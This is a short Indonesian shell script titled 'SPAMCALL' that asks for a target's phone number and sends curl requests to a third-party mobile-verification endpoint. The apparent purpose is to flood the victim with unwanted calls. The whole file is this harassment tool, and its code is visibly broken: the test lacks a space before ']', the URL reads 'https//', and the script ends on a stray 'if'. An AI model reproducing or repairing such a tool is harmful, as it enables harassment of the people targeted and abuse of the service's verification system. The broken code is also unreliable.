#!/bin/sh

clear
figlet SPAMCALL
echo
sleep 2
echo "***************************"
echo "(+) AUTHOR	: DXBLACK (+)"
echo "***************************"
echo
echo "1. SPAM CALL"
echo "2. KELUAR"
echo
echo "***************************"
read -p "=> " dont

if [ $dont = 1]
then
read -p "Masukan No Target => " nomor;
link="https//id.jagreward.com/member/verify-mobile/$nomor"
curl -s $link
if
